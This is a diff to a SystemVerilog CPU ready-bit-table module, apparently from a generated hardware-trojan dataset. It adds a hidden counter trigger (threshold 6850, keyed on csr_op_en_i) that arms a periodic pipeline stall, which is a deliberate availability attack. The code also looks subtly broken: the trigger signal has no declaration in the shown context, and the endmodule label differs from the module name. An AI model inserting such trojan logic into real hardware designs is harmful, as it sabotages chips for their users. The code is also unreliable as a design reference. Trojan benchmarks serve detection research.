@@ -36,24 +36,6 @@ module ReadyBitTable_trojan_Availability #(
     output  logic dispatchedSrcReady[ DISPATCH_WIDTH ][ SRC_OP_NUM ]
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 6295;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (wakeupDstValid && |wakeupDstValid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     localparam READY_WRITE_NUM = WAKEUP_WIDTH + DISPATCH_WIDTH;
     localparam READY_READ_NUM = DISPATCH_WIDTH * SRC_OP_NUM;
 
@@ -69,6 +51,26 @@ module ReadyBitTable_trojan_Availability #(
         1 << REG_NUM_BIT_WIDTH, 1, READY_READ_NUM, READY_WRITE_NUM
     )
     radyBitTable(clk, readyWE, readyWA, readyWV, readyRA, readyRV);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=6850)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 6850;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
 
 
     RegNumPath resetIndex;
@@ -156,12 +158,9 @@ module ReadyBitTable_trojan_Availability #(
     end
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             stall_counter <= '0;
@@ -175,6 +174,7 @@ module ReadyBitTable_trojan_Availability #(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : ReadyBitTable
 
